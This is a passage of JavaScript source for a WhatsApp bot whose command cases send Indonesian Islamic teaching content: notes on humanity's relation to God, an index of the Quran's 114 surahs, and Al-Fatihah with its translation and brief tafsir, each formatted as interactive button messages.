┃4. *Diberi pilihan* - Bisa pilih taat atau maksiat. Malaikat tidak punya pilihan
┃5. *Khalifah di bumi* - Diberi amanah mengelola bumi
┗━━━━━━━━━━
⌲ \`𝐊𝐄𝐋𝐄𝐌𝐀𝐇𝐀𝐍 𝐌𝐀𝐍𝐔𝐒𝐈𝐀\`
┏━━━━━━━━
┃1. *Lupa dan lalai* - Makanya disyariatkan dzikir dan sholat
┃2. *Lemah* - Butuh makan, tidur, istirahat
┃3. *Banyak mengeluh* - Kecuali yang sabar dan sholat
┃4. *Cepat putus asa* - Kalau ditimpa musibah
┃5. *Zalim dan bodoh* - Kalau tidak diberi ilmu dan hidayah
┗━━━━━━━━━━
⌲ \`𝐇𝐔𝐁𝐔𝐍𝐆𝐀𝐍 𝐌𝐀𝐍𝐔𝐒𝐈𝐀 𝐃𝐄𝐍𝐆𝐀𝐍 𝐀𝐋𝐀𝐇\`
┏━━━━━━━━
┃1. *Hamba dan Tuhan* - Hubungan paling dasar. Kita hamba, Dia Tuhan
┃2. *Doa* - Kita boleh minta langsung ke Allah tanpa perantara
┃3. *Ibadah* - Sholat, puasa, zakat, haji, dzikir, semua untuk Allah
┃4. *Tawakal* - Setelah berusaha, serahkan hasil ke Allah
┃5. *Cinta dan takut* - Cinta karena nikmat-Nya, takut karena azab-Nya
┗━━━━━━━━━━
⌲ \`𝐇𝐔𝐁𝐔𝐍𝐆𝐀𝐍 𝐌𝐀𝐍𝐔𝐒𝐈𝐀 𝐃𝐄𝐍𝐆𝐀𝐍 𝐍𝐀𝐁𝐈 ﷺ\`
┏━━━━━━━━
┃1. *Mengikuti sunnahnya* - Wajib taat perintah dan larangan beliau
┃2. *Mencintai beliau* - Lebih dari diri sendiri, keluarga, harta
┃3. *Membela kehormatan beliau* - Jangan diam kalau dihina
┃4. *Memperbanyak sholawat* - Allah dan malaikat bersholawat untuk beliau
┃5. *Tidak berlebih-lebihan* - Jangan mengangkat beliau sampai jadi Tuhan
┗━━━━━━━━━━
⌲ \`𝐇𝐔𝐁𝐔𝐍𝐆𝐀𝐍 𝐌𝐀𝐍𝐔𝐒𝐈𝐀 𝐃𝐄𝐍𝐆𝐀𝐍 𝐌𝐀𝐋𝐀𝐈𝐊𝐀𝐓\`
┏━━━━━━━━
┃1. *Malaikat mencatat amal kita* - Setiap kata, perbuatan, niat
┃2. *Malaikat mendoakan orang beriman* - Yang sholat, infak, dzikir
┃3. *Malaikat menjaga manusia* - Dari bahaya dengan izin Allah
┃4. *Malaikat mencabut nyawa* - Saat ajal tiba
┃5. *Kita tidak bisa melihat mereka* - Kecuali dengan izin Allah
┗━━━━━━━━━━
⌲ \`𝐏𝐄𝐒𝐀𝐍 𝐔𝐍𝐓𝐔𝐊 𝐌𝐀𝐍𝐔𝐒𝐈𝐀\`
┏━━━━━━━━
┃1. *Kenalilah dirimu* - Kau berasal dari apa, mau kemana, untuk apa hidup
┃2. *Jangan sombong* - Asalmu dari tanah, akhirmu jadi tanah
┃3. *Manfaatkan akal* - Untuk mengenal Allah dan taat kepada-Nya
┃4. *Kendalikan nafsu* - Itu ujian terberat manusia
┃5. *Siapkan bekal* - Kematian datang tiba-tiba, amal sholeh bekal utamamu
┗━━━━━━━━━━
⌲ \`𝐏𝐄𝐍𝐔𝐓𝐔𝐏\`
"Dan Aku tidak menciptakan jin dan manusia melainkan supaya mereka beribadah kepada-Ku." 
QS. Adz-Dzariyat 56

Manusia itu mulia kalau taat, hina kalau maksiat.
Malaikat mulia karena taat terus, tapi manusia yang taat lebih mulia karena melawan nafsu.

Semoga kita jadi manusia yang Allah ridhai.
\`[👤] 𝐌𝐀𝐍𝐔𝐒𝐈𝐀 𝐈𝐓𝐔 𝐊𝐇𝐀𝐋𝐈𝐅𝐀𝐇 𝐃𝐈 𝐁𝐔𝐌𝐈 [👤]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐇𝐀𝐊𝐈𝐊𝐀𝐓 𝐌𝐀𝐍𝐔𝐒𝐈𝐀',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐌𝐀𝐍𝐔𝐒𝐈𝐀",
 url: `https://quran.com`,
 copy_code: "ALHAMDULILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9],
 list_title: "CLICK",
 button_title: "© TENTANG MANUSIA"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© TENTANG MANUSIA",
 sections: [{
 title: "Bab Perbandingan",
 highlight_label: "𝐊𝐄𝐍𝐀𝐋𝐈 𝐇𝐀𝐊𝐈𝐊𝐀𝐓 🚀",
 rows: [
 { title: "𝐀𝐥𝐚𝐡 𝐬𝐞𝐛𝐚𝐠𝐚𝐢 𝐓𝐮𝐡𝐚𝐧", description: "𝐏𝐞𝐧𝐜𝐢𝐩𝐭𝐚 𝐬𝐞𝐦𝐞𝐬𝐭𝐚 𝐚𝐥𝐚𝐦", id: `${prefix}manusia` },
 { title: "𝐌𝐚𝐥𝐚𝐢𝐤𝐚𝐭 𝐬𝐞𝐛𝐚𝐠𝐚𝐢 𝐇𝐚𝐦𝐛𝐚", description: "𝐌𝐚𝐤𝐡𝐥𝐮𝐤 𝐜𝐚𝐡𝐚𝐲𝐚 𝐲𝐚𝐧𝐠 𝐭𝐚𝐭", id: `${prefix}manusia` },
 { title: "𝐍𝐚𝐛𝐢 & 𝐑𝐚𝐬𝐮𝐥", description: "𝐌𝐚𝐧𝐮𝐬𝐢𝐚 𝐩𝐢𝐥𝐢𝐡𝐚𝐧 𝐩𝐞𝐦𝐛𝐚𝐰𝐚 𝐰𝐚𝐡𝐲𝐮", id: `${prefix}manusia` },
 { title: "𝐌𝐚𝐧𝐮𝐬𝐢𝐚 𝐛𝐢𝐚𝐬𝐚", description: "𝐌𝐚𝐤𝐡𝐥𝐮𝐤 𝐲𝐚𝐧𝐠 𝐝𝐢𝐮𝐣𝐢 𝐝𝐢 𝐛𝐮𝐦𝐢", id: `${prefix}manusia` },
 { title: "𝐏𝐞𝐫𝐛𝐞𝐝𝐚𝐧 𝐔𝐭𝐚𝐦𝐚", description: "𝐁𝐞𝐝𝐚 𝐤𝐞𝐝𝐮𝐝𝐮𝐤𝐚𝐧 𝐦𝐞𝐫𝐞𝐤𝐚", id: `${prefix}manusia` },
 { title: "𝐅𝐚𝐤𝐭𝐚 𝐌𝐚𝐧𝐮𝐬𝐢𝐚", description: "𝐀𝐬𝐚𝐥, 𝐮𝐣𝐢𝐚𝐧, 𝐤𝐞𝐦𝐚𝐭𝐢𝐚𝐧", id: `${prefix}manusia` },
 { title: "𝐇𝐮𝐛𝐮𝐧𝐠𝐚𝐧 𝐝𝐞𝐧𝐠𝐚𝐧 𝐀𝐥𝐚𝐡", description: "𝐇𝐚𝐦𝐛𝐚 𝐝𝐞𝐧𝐠𝐚𝐧 𝐓𝐮𝐡𝐚𝐧", id: `${prefix}manusia` },
 { title: "𝐇𝐮𝐛𝐮𝐧𝐠𝐚𝐧 𝐝𝐞𝐧𝐠𝐚𝐧 𝐍𝐚𝐛𝐢", description: "𝐔𝐦𝐚𝐭 𝐝𝐞𝐧𝐠𝐚𝐧 𝐑𝐚𝐬𝐮𝐥", id: `${prefix}manusia` },
 { title: "𝐇𝐮𝐛𝐮𝐧𝐠𝐚𝐧 𝐝𝐞𝐧𝐠𝐚𝐧 𝐌𝐚𝐥𝐚𝐢𝐤𝐚𝐭", description: "𝐘𝐚𝐧𝐠 𝐦𝐞𝐧𝐜𝐚𝐭𝐚𝐭 𝐚𝐦𝐚𝐥 𝐤𝐢𝐭𝐚", id: `${prefix}manusia` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'alquran':
case 'quran':
case 'kitab': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗘𝗟𝗨𝗥𝗨𝗛 𝗜𝗦𝗜 𝗔𝗟-𝗤𝗨𝗥𝗔𝗡 & 𝗞𝗜𝗧𝗔𝗕 𝗦𝗔𝗠𝗔𝗪𝗜\`

Assalamualaikum \`${pushname}\` 👋 Ini index lengkap Al-Quran 114 surat. 
Ketik \`.alquran [nama surat]\` buat baca 1 surat lengkap.

⌲ \`𝐀𝐋-𝐐𝐔𝐑𝐀𝐍 𝐒𝐄𝐂𝐀𝐑𝐀 𝐔𝐌𝐔𝐌\`
┏━━━━━━━━
┃1. *Jumlah Surat* - 114 surat
┃2. *Jumlah Ayat* - 6236 ayat menurut Hafs
┃3. *Jumlah Juz* - 30 juz
┃4. *Jumlah Hizb* - 60 hizb
┃5. *Turun di* - Makkiyah 86 surat, Madaniyah 28 surat
┃6. *Bahasa* - Arab, diturunkan ke Nabi Muhammad ﷺ selama 23 tahun
┃7. *Kedudukan* - Kitab terakhir, menyempurnakan kitab sebelumnya
┗━━━━━━━━━━
⌲ \`𝐊𝐈𝐓𝐀𝐁 𝐒𝐀𝐌𝐀𝐖𝐈 𝐘𝐀𝐍𝐆 𝐖𝐀𝐉𝐈𝐁 𝐃𝐈𝐈𝐌𝐀𝐍𝐈\`
┏━━━━━━━━
┃1. *Suhuf* - Lembaran Nabi Ibrahim AS dan Musa AS
┃2. *Taurat* - Kitab Nabi Musa AS. Asli sudah tidak ada, isinya masuk ke Al-Quran
┃3. *Zabur* - Kitab Nabi Daud AS. Berisi dzikir, doa, hikmah
┃4. *Injil* - Kitab Nabi Isa AS. Asli sudah tidak ada
┃5. *Al-Quran* - Kitab Nabi Muhammad ﷺ. Dijaga Allah sampai kiamat
┗━━━━━━━━━━
⌲ \`𝐃𝐀𝐅𝐓𝐀𝐑 114 𝐒𝐔𝐑𝐀𝐓\`
Gunakan: .alquran [nama surat]
Contoh: .alquran al-baqarah

┏━━━━━━━━
┃1. Al-Fatihah - Pembukaan - 7 ayat - Makkiyah
┃2. Al-Baqarah - Sapi Betina - 286 ayat - Madaniyah
┃3. Ali Imran - Keluarga Imran - 200 ayat - Madaniyah
┃4. An-Nisa - Wanita - 176 ayat - Madaniyah
┃5. Al-Ma'idah - Hidangan - 120 ayat - Madaniyah
┃6. Al-An'am - Binatang Ternak - 165 ayat - Makkiyah
┃7. Al-A'raf - Tempat Tertinggi - 206 ayat - Makkiyah
┃8. Al-Anfal - Harta Rampasan - 75 ayat - Madaniyah
┃9. At-Taubah - Pengampunan - 129 ayat - Madaniyah
┃10. Yunus - Nabi Yunus - 109 ayat - Makkiyah
┃11. Hud - Nabi Hud - 123 ayat - Makkiyah
┃12. Yusuf - Nabi Yusuf - 111 ayat - Makkiyah
┃13. Ar-Ra'd - Guruh - 43 ayat - Madaniyah
┃14. Ibrahim - Nabi Ibrahim - 52 ayat - Makkiyah
┃15. Al-Hijr - Lembah Hijr - 99 ayat - Makkiyah
┃16. An-Nahl - Lebah - 128 ayat - Makkiyah
┃17. Al-Isra - Perjalanan Malam - 111 ayat - Makkiyah
┃18. Al-Kahfi - Gua - 110 ayat - Makkiyah
┃19. Maryam - Maryam - 98 ayat - Makkiyah
┃20. Taha - Thaha - 135 ayat - Makkiyah
┃21. Al-Anbiya - Para Nabi - 112 ayat - Makkiyah
┃22. Al-Hajj - Haji - 78 ayat - Madaniyah
┃23. Al-Mu'minun - Orang Beriman - 118 ayat - Makkiyah
┃24. An-Nur - Cahaya - 64 ayat - Madaniyah
┃25. Al-Furqan - Pembeda - 77 ayat - Makkiyah
┃26. Asy-Syu'ara - Para Penyair - 227 ayat - Makkiyah
┃27. An-Naml - Semut - 93 ayat - Makkiyah
┃28. Al-Qash - Kisah-Kisah - 88 ayat - Makkiyah
┃29. Al-Ankabut - Laba-Laba - 69 ayat - Makkiyah
┃30. Ar-Rum - Bangsa Romawi - 60 ayat - Makkiyah
┃31. Luqman - Luqman - 34 ayat - Makkiyah
┃32. As-Sajdah - Sujud - 30 ayat - Makkiyah
┃33. Al-Ahzab - Golongan Bersekutu - 73 ayat - Madaniyah
┃34. Saba - Saba - 54 ayat - Makkiyah
┃35. Fatir - Pencipta - 45 ayat - Makkiyah
┃36. Yasin - Yasin - 83 ayat - Makkiyah
┃37. As-Saffat - Yang Bershaf-Shaf - 182 ayat - Makkiyah
┃38. Sad - Shad - 88 ayat - Makkiyah
┃39. Az-Zumar - Rombongan - 75 ayat - Makkiyah
┃40. Ghafir - Yang Mengampuni - 85 ayat - Makkiyah
┃41. Fussilat - Yang Dijelaskan - 54 ayat - Makkiyah
┃42. Asy-Syura - Musyawarah - 53 ayat - Makkiyah
┃43. Az-Zukhruf - Perhiasan - 89 ayat - Makkiyah
┃44. Ad-Dukhan - Kabut - 59 ayat - Makkiyah
┃45. Al-Jatsiyah - Yang Berlutut - 37 ayat - Makkiyah
┃46. Al-Ahqaf - Bukit Pasir - 35 ayat - Makkiyah
┃47. Muhammad - Nabi Muhammad - 38 ayat - Madaniyah
┃48. Al-Fath - Kemenangan - 29 ayat - Madaniyah
┃49. Al-Hujurat - Kamar-Kamar - 18 ayat - Madaniyah
┃50. Qaf - Qaf - 45 ayat - Makkiyah
┃51. Adz-Dzariyat - Angin yang Menerbangkan - 60 ayat - Makkiyah
┃52. At-Tur - Gunung Thur - 49 ayat - Makkiyah
┃53. An-Najm - Bintang - 62 ayat - Makkiyah
┃54. Al-Qamar - Bulan - 55 ayat - Makkiyah
┃55. Ar-Rahman - Yang Maha Pemurah - 78 ayat - Madaniyah
┃56. Al-Waqi'ah - Hari Kiamat - 96 ayat - Makkiyah
┃57. Al-Hadid - Besi - 29 ayat - Madaniyah
┃58. Al-Mujadilah - Wanita yang Mengajukan Gugatan - 22 ayat - Madaniyah
┃59. Al-Hasyr - Pengusiran - 24 ayat - Madaniyah
┃60. Al-Mumtahanah - Wanita yang Diuji - 13 ayat - Madaniyah
┃61. As-Saff - Barisan - 14 ayat - Madaniyah
┃62. Al-Jumu'ah - Hari Jumat - 11 ayat - Madaniyah
┃63. Al-Munafiqun - Orang Munafik - 11 ayat - Madaniyah
┃64. At-Taghabun - Hari Dinampakkan Kesalahan - 18 ayat - Madaniyah
┃65. At-Talaq - Talak - 12 ayat - Madaniyah
┃66. At-Tahrim - Pengharaman - 12 ayat - Madaniyah
┃67. Al-Mulk - Kerajaan - 30 ayat - Makkiyah
┃68. Al-Qalam - Pena - 52 ayat - Makkiyah
┃69. Al-Haqqah - Hari Kiamat - 52 ayat - Makkiyah
┃70. Al-Ma'arij - Tempat Naik - 44 ayat - Makkiyah
┃71. Nuh - Nabi Nuh - 28 ayat - Makkiyah
┃72. Al-Jin - Jin - 28 ayat - Makkiyah
┃73. Al-Muzzammil - Orang yang Berselimut - 20 ayat - Makkiyah
┃74. Al-Muddatstsir - Orang yang Berselimut - 56 ayat - Makkiyah
┃75. Al-Qiyamah - Hari Kiamat - 40 ayat - Makkiyah
┃76. Al-Insan - Manusia - 31 ayat - Madaniyah
┃77. Al-Mursalat - Malaikat yang Diutus - 50 ayat - Makkiyah
┃78. An-Naba - Berita Besar - 40 ayat - Makkiyah
┃79. An-Nazi'at - Malaikat yang Mencabut - 46 ayat - Makkiyah
┃80. Abasa - Ia Bermuka Masam - 42 ayat - Makkiyah
┃81. At-Takwir - Menggulung - 29 ayat - Makkiyah
┃82. Al-Infithar - Terbelah - 19 ayat - Makkiyah
┃83. Al-Muthaffifin - Orang yang Curang - 36 ayat - Makkiyah
┃84. Al-Insyiqaq - Terbelah - 25 ayat - Makkiyah
┃85. Al-Buruj - Gugusan Bintang - 22 ayat - Makkiyah
┃86. At-Tariq - Yang Datang di Malam Hari - 17 ayat - Makkiyah
┃87. Al-A'la - Yang Paling Tinggi - 19 ayat - Makkiyah
┃88. Al-Ghasyiyah - Hari Pembalasan - 26 ayat - Makkiyah
┃89. Al-Fajr - Fajar - 30 ayat - Makkiyah
┃90. Al-Balad - Negeri - 20 ayat - Makkiyah
┃91. Asy-Syams - Matahari - 15 ayat - Makkiyah
┃92. Al-Lail - Malam - 21 ayat - Makkiyah
┃93. Adh-Dhuha - Waktu Dhuha - 11 ayat - Makkiyah
┃94. Al-Insyirah - Kelapangan - 8 ayat - Makkiyah
┃95. At-Tin - Buah Tin - 8 ayat - Makkiyah
┃96. Al-Alaq - Segumpal Darah - 19 ayat - Makkiyah
┃97. Al-Qadr - Kemuliaan - 5 ayat - Makkiyah
┃98. Al-Bayyinah - Bukti Nyata - 8 ayat - Madaniyah
┃99. Az-Zalzalah - Kegoncangan - 8 ayat - Madaniyah
┃100. Al-Adiyat - Kuda Perang - 11 ayat - Makkiyah
┃101. Al-Qari'ah - Hari Kiamat - 11 ayat - Makkiyah
┃102. At-Takatsur - Bermegah-megahan - 8 ayat - Makkiyah
┃103. Al-Asr - Masa - 3 ayat - Makkiyah
┃104. Al-Humazah - Pengumpat - 9 ayat - Makkiyah
┃105. Al-Fil - Gajah - 5 ayat - Makkiyah
┃106. Quraisy - Suku Quraisy - 4 ayat - Makkiyah
┃107. Al-Ma'un - Barang yang Bermanfaat - 7 ayat - Makkiyah
┃108. Al-Kautsar - Nikmat yang Banyak - 3 ayat - Makkiyah
┃109. Al-Kafirun - Orang Kafir - 6 ayat - Makkiyah
┃110. An-Nashr - Pertolongan - 3 ayat - Madaniyah
┃111. Al-Masad - Tali Sabut - 5 ayat - Makkiyah
┃112. Al-Ikhlas - Memurnikan Keesaan Allah - 4 ayat - Makkiyah
┃113. Al-Falaq - Waktu Subuh - 5 ayat - Makkiyah
┃114. An-Nas - Manusia - 6 ayat - Makkiyah
┗━━━━━━━━━━
⌲ \`𝐂𝐀𝐑𝐀 𝐏𝐀𝐊𝐀𝐈\`
┏━━━━━━━━
┃1. Ketik .alquran al-fatihah - keluar surat Al-Fatihah + arti
┃2. Ketik .alquran al-baqarah 1-5 - keluar ayat 1-5 surat Al-Baqarah
┃3. Ketik .alquran juz 1 - keluar juz 1 lengkap
┃4. Ketik .alquran tafsir al-ikhlas - keluar tafsir singkat
┗━━━━━━━━━━
⌲ \`𝐊𝐄𝐔𝐓𝐀𝐌𝐀𝐍 𝐀𝐋-𝐐𝐔𝐑𝐀𝐍\`
┏━━━━━━━━
┃1. "Sebaik-baik kalian adalah yang belajar Al-Quran dan mengajarkannya" HR. Bukhari
┃2. Setiap huruf dibaca dapat 10 kebaikan
┃3. Jadi syafaat di hari kiamat bagi pembacanya
┃4. Orang yang mahir baca Al-Quran bersama malaikat yang mulia
┃5. Rumah yang dibacakan Al-Quran jadi terang dan dijauhi setan
┗━━━━━━━━━━
⌲ \`𝐀𝐃𝐀𝐁 𝐌𝐄𝐌𝐁𝐀𝐂𝐀 𝐀𝐋-𝐐𝐔𝐑𝐀𝐍\`
┏━━━━━━━━
┃1. Suci dari hadas kecil dan besar
┃2. Menghadap kiblat, tenang, khusyuk
┃3. Membaca ta'awudz dan bismillah
┃4. Membaca dengan tartil, perlahan dan jelas
┃5. Mentadabburi maknanya, tidak hanya dibaca
┃6. Tidak memegang mushaf kecuali dalam keadaan suci
┗━━━━━━━━━━
\`[📖] 𝐀𝐋-𝐐𝐔𝐑𝐀𝐍 𝐏𝐄𝐃𝐎𝐌𝐀𝐍 𝐇𝐈𝐃𝐔𝐏 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋-𝐐𝐔𝐑𝐀𝐍",
 url: `https://quran.com`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3, 4],
 list_title: "CLICK",
 button_title: "© AL-QURAN"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AL-QURAN",
 sections: [{
 title: "Menu Al-Quran",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐐𝐔𝐑𝐀𝐍 🚀",
 rows: [
 { title: "𝐃𝐚𝐟𝐭𝐚𝐫 𝐒𝐮𝐫𝐚𝐭", description: "𝐋𝐢𝐡𝐚𝐭 114 𝐬𝐮𝐫𝐚𝐭 + 𝐣𝐮𝐦𝐥𝐚𝐡 𝐚𝐲𝐚𝐭", id: `${prefix}alquran` },
 { title: "𝐀𝐥-𝐅𝐚𝐭𝐢𝐡𝐚𝐡", description: "𝐒𝐮𝐫𝐚𝐭 𝐩𝐞𝐦𝐛𝐮𝐤𝐚𝐧", id: `${prefix}alquran al-fatihah` },
 { title: "𝐀𝐥-𝐁𝐚𝐪𝐚𝐫𝐚𝐡", description: "𝐒𝐮𝐫𝐚𝐭 𝐩𝐚𝐧𝐣𝐚𝐧𝐠 286 𝐚𝐲𝐚𝐭", id: `${prefix}alquran al-baqarah` },
 { title: "𝐀𝐥-𝐈𝐤𝐡𝐥𝐚𝐬", description: "𝐒𝐮𝐫𝐚𝐭 𝐩𝐞𝐦𝐮𝐫𝐧𝐢𝐚𝐧 𝐭𝐚𝐮𝐡𝐢𝐝", id: `${prefix}alquran al-ikhlas` },
 { title: "𝐉𝐮𝐳 30", description: "𝐉𝐮𝐳 𝐚𝐦𝐚 𝐥𝐞𝐧𝐠𝐤𝐚𝐩", id: `${prefix}alquran juz 30` },
 { title: "𝐊𝐢𝐭𝐚𝐛 𝐒𝐚𝐦𝐚𝐰𝐢", description: "𝐓𝐚𝐮𝐫𝐚𝐭, 𝐙𝐚𝐛𝐮𝐫, 𝐈𝐧𝐣𝐢𝐥, 𝐀𝐥-𝐐𝐮𝐫𝐚𝐧", id: `${prefix}alquran kitab` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'al-fatihah':
case 'fatihah':
case 'alfatihah': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗙𝗔𝗧𝗜𝗛𝗔𝗛\`
Surat ke-1 | 7 ayat | Makkiyah | Pembukaan

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
اَلْحَمْدُ لِلّٰهِ رَبِّ الْعٰلَمِيْنَۙ
الرَّحْمٰنِ الرَّحِيْمِۙ
مٰلِكِ يَوْمِ الدِّيْنِۗ
اِيَّاكَ نَعْبُدُ وَاِيَّاكَ نَسْتَعِيْنُۗ
اِهْدِنَا الصِّرَاطَ الْمُسْتَقِيْمَۙ
صِرَاطَ الَّذِيْنَ اَنْعَمْتَ عَلَيْهِمْ ەۙ غَيْرِ الْمَغْضُوْبِ عَلَيْهِمْ وَلَا الضَّاۤلِّيْنَ ࣖ

⌲ \`𝐓𝐑𝐀𝐍𝐒𝐋𝐈𝐓𝐄𝐑𝐀𝐒𝐈\`
Bismillahirrahmanirrahim
Alhamdu lillahi rabbil 'alamin
Ar-rahmanirrahim
Maliki yaumiddin
Iyyaka na'budu wa iyyaka nasta'in
Ihdinash-shirathal mustaqim
Shirathal-ladzina an'amta 'alaihim ghairil maghdubi 'alaihim wa ladhdhallin

⌲ \`𝐀𝐑𝐓𝐈 𝐈𝐍𝐃𝐎𝐍𝐄𝐒𝐈𝐀\`
1. Dengan nama Allah Yang Maha Pengasih, Maha Penyayang.
2. Segala puji bagi Allah, Tuhan seluruh alam,
3. Yang Maha Pengasih, Maha Penyayang,
4. Pemilik hari pembalasan.
5. Hanya kepada Engkaulah kami menyembah dan hanya kepada Engkaulah kami mohon pertolongan.
6. Tunjukilah kami jalan yang lurus,
7. (yaitu) jalan orang-orang yang telah Engkau beri nikmat kepadanya; bukan (jalan) mereka yang dimurkai, dan bukan (pula jalan) mereka yang sesat.

⌲ \`𝐊𝐄𝐔𝐓𝐀𝐌𝐀𝐍 & 𝐅𝐀𝐈𝐃𝐀𝐇\`
┏━━━━━━━━
┃1. Disebut Ummul Kitab - Induk Al-Quran
┃2. Rukun sholat, tidak sah sholat tanpa Al-Fatihah
┃3. Doa pembuka, berisi pujian, permohonan, pengakuan ubudiyah
┃4. Nabi ﷺ bersabda: "Tidak ada sholat bagi yang tidak membaca Fatihatul Kitab" HR. Bukhari Muslim
┃5. Jadi ruqyah untuk mengobati penyakit dengan izin Allah
┗━━━━━━━━━━
⌲ \`𝐓𝐀𝐅𝐒𝐈𝐑 𝐒𝐈𝐍𝐆𝐊𝐀𝐓\`
┏━━━━━━━━
┃Ayat 1-3: Pujian kepada Allah sebagai Rabb, Ar-Rahman, Ar-Rahim
┃Ayat 4: Pengakuan bahwa hanya Allah yang berkuasa di hari kiamat
┃Ayat 5: Ikrar ibadah dan istianah hanya kepada Allah
┃Ayat 6-7: Permohonan agar diberi hidayah ke jalan orang sholeh, bukan jalan orang yang dimurkai dan sesat
┗━━━━━━━━━━
\`[📖] 𝐁𝐀𝐂𝐀𝐋𝐀𝐇 𝐒𝐄𝐓𝐈𝐀𝐏 𝐒𝐇𝐎𝐋𝐀𝐓 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋-𝐅𝐀𝐓𝐈𝐇𝐀𝐇",
 url: `https://quran.com/1`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3],
 list_title: "CLICK",
 button_title: "© AL-FATIHAH"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AL-FATIHAH",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐀𝐫𝐚𝐛 & 𝐀𝐫𝐭𝐢", description: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛 𝐝𝐚𝐧 𝐭𝐞𝐫𝐣𝐞𝐦𝐚𝐡𝐚𝐧", id: `${prefix}al-fatihah` },
 { title: "𝐓𝐚𝐟𝐬𝐢𝐫 𝐒𝐢𝐧𝐠𝐤𝐚𝐭", description: "𝐌𝐚𝐤𝐧𝐚 𝐩𝐞𝐫-𝐚𝐲𝐚𝐭", id: `${prefix}al-fatihah` },
 { title: "𝐊𝐞𝐮𝐭𝐚𝐦𝐚𝐧", description: "𝐅𝐚𝐢𝐝𝐚𝐡 𝐦𝐞𝐦𝐛𝐚𝐜𝐚 𝐀𝐥-𝐅𝐚𝐭𝐢𝐡𝐚𝐡", id: `${prefix}al-fatihah` },
